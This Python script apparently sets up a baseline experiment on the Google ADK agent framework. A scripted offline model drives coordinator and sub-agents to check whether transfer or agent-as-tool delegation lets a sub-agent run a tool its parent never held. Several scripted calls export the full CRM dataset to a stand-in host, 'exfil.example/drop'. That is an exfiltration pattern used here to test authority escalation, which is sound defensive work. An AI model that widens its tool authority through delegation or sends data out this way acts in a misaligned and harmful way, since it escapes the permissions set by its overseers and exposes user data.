"""
Baseline: does a Google ADK sub-agent inherit its parent's tools, and can a
transfer WIDEN authority?

Framework alone. attenu_guard is deliberately NOT imported.
Offline: the model is a scripted BaseLlm subclass, so no API key and no network.
The ADK Runner, flows, transfer tool and function-call handling are all real.

Three experiments:
  A  parent tools {crm_query}; sub-agent tools {crm_query, crm_export}.
     Parent transfers. Does the sub-agent's crm_export BODY run?
  B  parent tools {crm_query}; sub-agent declares NO tools.
     Parent transfers. Does the sub-agent get the parent's crm_query?
  C  AgentTool: parent tools {crm_query, AgentTool(child)}; child holds crm_export.
     Parent calls the agent-as-tool. Does crm_export run under the parent's turn?
"""
from __future__ import annotations

import asyncio
import datetime
import importlib.metadata as md
import sys
from typing import Any, AsyncGenerator

from google.adk.agents.llm_agent import LlmAgent
from google.adk.apps.app import App
from google.adk.models.base_llm import BaseLlm
from google.adk.models.llm_request import LlmRequest
from google.adk.models.llm_response import LlmResponse
from google.adk.runners import Runner
from google.adk.sessions.in_memory_session_service import InMemorySessionService
from google.adk.tools.agent_tool import AgentTool
from google.genai import types

# ADK stamps the calling agent's name into llm_request.config.labels
# (google/adk/flows/llm_flows/base_llm_flow.py, _ADK_AGENT_NAME_LABEL_KEY),
# so one model instance can drive a whole multi-agent scenario.
_AGENT_LABEL = "adk_agent_name"

BODIES_THAT_RAN: list[tuple[str, Any]] = []
TOOLS_OFFERED: dict[str, list[str]] = {}


class ScriptedLlm(BaseLlm):
    """Replays a per-agent queue of Parts and records the tools each agent is offered."""

    model: str = "scripted-offline-model"
    script: dict[str, list] = {}

    async def generate_content_async(
        self, llm_request: LlmRequest, stream: bool = False
    ) -> AsyncGenerator[LlmResponse, None]:
        labels = (llm_request.config.labels or {}) if llm_request.config else {}
        agent = labels.get(_AGENT_LABEL)
        # tools_dict is exactly what ADK will let this agent invoke this turn.
        TOOLS_OFFERED.setdefault(agent, sorted(llm_request.tools_dict.keys()))
        queue = self.script.get(agent) or []
        part = queue.pop(0) if queue else types.Part.from_text(text=f"[{agent}] done.")
        yield LlmResponse(content=types.Content(role="model", parts=[part]))


def crm_query(rows: int) -> dict:
    """Read `rows` rows from the CRM."""
    BODIES_THAT_RAN.append(("crm_query", rows))
    return {"rows_returned": rows}


def crm_export(destination: str) -> dict:
    """Export the whole CRM dataset to an external `destination`."""
    BODIES_THAT_RAN.append(("crm_export", destination))
    return {"exported_to": destination}


def _fc(name: str, **args) -> types.Part:
    return types.Part.from_function_call(name=name, args=args)


def _text(t: str) -> types.Part:
    return types.Part.from_text(text=t)


async def _run(root: LlmAgent, message: str, app_name: str) -> None:
    sessions = InMemorySessionService()
    runner = Runner(app=App(name=app_name, root_agent=root), session_service=sessions)
    session = await sessions.create_session(app_name=app_name, user_id="u")
    async for event in runner.run_async(
        user_id="u",
        session_id=session.id,
        new_message=types.Content(role="user", parts=[_text(message)]),
    ):
        for part in (event.content.parts if event.content and event.content.parts else []):
            if part.function_call:
                print(f"    [{event.author}] -> calls {part.function_call.name}"
                      f"({dict(part.function_call.args or {})})")
            elif part.function_response:
                print(f"    [{event.author}] <- {part.function_response.name}: "
                      f"{part.function_response.response}")
            elif part.text:
                print(f"    [{event.author}] says: {part.text}")


def _reset() -> None:
    BODIES_THAT_RAN.clear()
    TOOLS_OFFERED.clear()


# ======================================================================
async def experiment_a() -> None:
    print("=" * 74)
    print("EXPERIMENT A — parent {crm_query}; sub-agent {crm_query, crm_export}")
    print("=" * 74)
    _reset()
    model = ScriptedLlm(script={
        "coordinator": [_fc("transfer_to_agent", agent_name="specialist")],
        "specialist": [
            _fc("crm_query", rows=50),
            _fc("crm_export", destination="https://exfil.example/drop"),
            _text("Done."),
        ],
    })
    specialist = LlmAgent(
        name="specialist", model=model, description="Handles CRM detail work.",
        instruction="Do the CRM work.", tools=[crm_query, crm_export],
    )
    coordinator = LlmAgent(
        name="coordinator", model=model, description="Routes work.",
        instruction="Delegate to the specialist.",
        tools=[crm_query], sub_agents=[specialist],
    )
    await _run(coordinator, "Handle the CRM request.", "expA")
    print(f"\n  tools offered to coordinator : {TOOLS_OFFERED.get('coordinator')}")
    print(f"  tools offered to specialist  : {TOOLS_OFFERED.get('specialist')}")
    print(f"  tool bodies that RAN         : {BODIES_THAT_RAN}")
    ran = any(n == "crm_export" for n, _ in BODIES_THAT_RAN)
    print(f"\n  crm_export body ran? {ran}")
    print("  => the sub-agent held a tool the parent never held, and it EXECUTED."
          if ran else "  => crm_export did not run.")


async def experiment_b() -> None:
    print("\n" + "=" * 74)
    print("EXPERIMENT B — parent {crm_query}; sub-agent declares NO tools")
    print("=" * 74)
    _reset()
    model = ScriptedLlm(script={
        "coordinator": [_fc("transfer_to_agent", agent_name="bare")],
        "bare": [_fc("crm_query", rows=7), _text("Done.")],
    })
    bare = LlmAgent(
        name="bare", model=model, description="Has no tools of its own.",
        instruction="Try to read the CRM.", tools=[],
    )
    coordinator = LlmAgent(
        name="coordinator", model=model, description="Routes work.",
        instruction="Delegate to bare.", tools=[crm_query], sub_agents=[bare],
    )
    try:
        await _run(coordinator, "Handle the CRM request.", "expB")
    except Exception as exc:  # noqa: BLE001 - the failure mode IS the result
        print(f"    ADK raised: {type(exc).__name__}: {exc}")
    print(f"\n  tools offered to coordinator : {TOOLS_OFFERED.get('coordinator')}")
    print(f"  tools offered to bare        : {TOOLS_OFFERED.get('bare')}")
    print(f"  tool bodies that RAN         : {BODIES_THAT_RAN}")
    inherited = "crm_query" in (TOOLS_OFFERED.get("bare") or [])
    print(f"\n  did 'bare' inherit the parent's crm_query? {inherited}")


async def experiment_c() -> None:
    print("\n" + "=" * 74)
    print("EXPERIMENT C — AgentTool: parent {crm_query, AgentTool(exporter)};"
          " exporter holds crm_export")
    print("=" * 74)
    _reset()
    model = ScriptedLlm(script={
        "coordinator": [_fc("exporter", request="ship the data"), _text("Done.")],
        "exporter": [
            _fc("crm_export", destination="https://exfil.example/drop"),
            _text("Exported."),
        ],
    })
    exporter = LlmAgent(
        name="exporter", model=model, description="Exports CRM data.",
        instruction="Export it.", tools=[crm_export],
    )
    coordinator = LlmAgent(
        name="coordinator", model=model, description="Routes work.",
        instruction="Use the exporter tool.",
        tools=[crm_query, AgentTool(agent=exporter)],
    )
    await _run(coordinator, "Ship the CRM data.", "expC")
    print(f"\n  tools offered to coordinator : {TOOLS_OFFERED.get('coordinator')}")
    print(f"  tools offered to exporter    : {TOOLS_OFFERED.get('exporter')}")
    print(f"  tool bodies that RAN         : {BODIES_THAT_RAN}")
    ran = any(n == "crm_export" for n, _ in BODIES_THAT_RAN)
    print(f"\n  crm_export body ran under the parent's turn? {ran}")


async def experiment_d() -> None:
    print("\n" + "=" * 74)
    print("EXPERIMENT D — what disallow_transfer_to_peers actually blocks")
    print("=" * 74)
    _reset()
    model = ScriptedLlm(script={
        "coordinator": [_fc("transfer_to_agent", agent_name="a_agent")],
        "a_agent": [_fc("transfer_to_agent", agent_name="b_agent"), _text("Done.")],
        "b_agent": [_fc("crm_export", destination="https://exfil.example/drop"),
                    _text("Done.")],
    })
    b_agent = LlmAgent(name="b_agent", model=model, description="Holds export.",
                       instruction="Export.", tools=[crm_export])
    a_agent = LlmAgent(name="a_agent", model=model, description="Peer A.",
                       instruction="Hand to b_agent.", tools=[crm_query],
                       disallow_transfer_to_peers=True)
    coordinator = LlmAgent(name="coordinator", model=model, description="Routes.",
                           instruction="Delegate.", tools=[crm_query],
                           sub_agents=[a_agent, b_agent])
    await _run(coordinator, "Go.", "expD")
    print(f"\n  tools offered to a_agent : {TOOLS_OFFERED.get('a_agent')}")
    print(f"  tool bodies that RAN     : {BODIES_THAT_RAN}")
    print("  => disallow_transfer_to_peers removes the transfer TARGET, not any tool"
          " authority.")


async def main() -> None:
    print(f"date (UTC)  : {datetime.datetime.now(datetime.timezone.utc).date()}")
    print(f"python      : {sys.version.split()[0]}")
    for pkg in ("google-adk", "google-genai"):
        print(f"{pkg:<12}: {md.version(pkg)}")
    print("attenu-guard: NOT IMPORTED (baseline is the framework alone)\n")
    await experiment_a()
    await experiment_b()
    await experiment_c()
    await experiment_d()


if __name__ == "__main__":
    asyncio.run(main())
